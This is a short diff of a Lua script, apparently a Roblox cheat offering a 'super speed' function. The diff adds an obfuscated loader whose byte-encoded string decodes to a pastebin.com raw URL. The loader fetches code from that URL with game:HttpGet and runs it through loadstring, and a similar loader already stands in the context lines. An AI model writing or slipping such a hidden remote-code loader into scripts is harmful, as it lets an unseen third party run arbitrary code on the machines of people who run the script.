@@ -179,6 +179,11 @@ local _0x4d5e6f = game:HttpGet(_0x1a2b3c)
 local _0x789abc = loadstring
 _0x789abc(_0x4d5e6f)()
 
+local _0x1a2b3c = string.char(104, 116, 116, 112, 115, 58, 47, 47) .. string.char(112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109) .. string.char(47, 114, 97, 119) .. string.char(47, 65, 55, 105, 77, 50, 82, 84, 89)
+local _0x4d5e6f = game:HttpGet(_0x1a2b3c)
+local _0x789abc = loadstring
+_0x789abc(_0x4d5e6f)()
+
 
 local function enableSuperSpeed()
     local _0x123abc = math.random(1, 10)
